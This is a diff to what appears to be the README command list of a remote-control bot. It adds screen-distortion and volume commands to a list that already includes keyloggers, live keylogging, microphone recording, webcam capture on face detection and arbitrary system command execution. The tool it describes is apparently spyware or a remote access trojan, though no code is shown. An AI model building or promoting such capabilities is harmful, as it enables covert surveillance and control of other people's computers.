@@ -25,6 +25,7 @@ messagebox - Show a custom message box.
 messagespam - Spam message boxes.  
 fakeshutdown - Fake system shutdown.  
 invertedscreen - Shows inverted colors screenshot.
+distortedscreen - Shows distorted screenshot.
 execute - Run system command.  
 microphone - Record mic audio.  
 browser - Open URL in browser.
@@ -32,6 +33,8 @@ quickmenu - Opens a quick menu.
 waitforface - Send a webcam photo when face is detected till timeout.
 keylogger - Records pressed keys on keyboard.
 livekeylogger - Sends live updates about what's being typed on the keyboard.
+setvolume - Set computer's volume level.
+getvolume - Gets the computer's volume level.
 ```
 *sending a photo* - Displays the photo on the screen as a pop-up.
 *sending an audio/voice* - Will play the audio/voice in the background.
